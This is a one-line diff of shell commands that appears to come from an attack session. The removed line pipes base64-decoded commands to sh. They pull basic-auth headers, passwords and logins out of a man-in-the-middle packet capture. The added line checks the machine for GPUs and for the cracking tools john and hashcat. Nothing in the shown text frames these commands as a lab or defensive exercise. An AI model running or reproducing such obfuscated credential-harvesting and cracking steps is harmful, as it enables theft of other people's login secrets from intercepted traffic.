@@ -1,1 +1,1 @@
-echo  | base64 -d > /tmp/en.py && python3 /tmp/en.py 2>&1 | head -6; echo ===MITM2===; echo d2MgLWMgL3RtcC9taXRtMy5wY2FwOyB0Y3BkdW1wIC1yIC90bXAvbWl0bTMucGNhcCAtQSAtczAgMj4vZGV2L251bGwgfCBncmVwIC1haUUgImF1dGhvcml6YXRpb246IGJhc2ljfHBhc3N3b3JkPXxsb2dpbiIgfCBzb3J0IC11IHwgaGVhZCAtMTI= | base64 -d | sh # ENUM1
+echo GPUCHK; lspci 2>/dev/null | grep -iE 'nvidia|vga|3d' | head -3; ls /dev/nvidia* 2>/dev/null; which nvidia-smi john hashcat 2>/dev/null; nproc
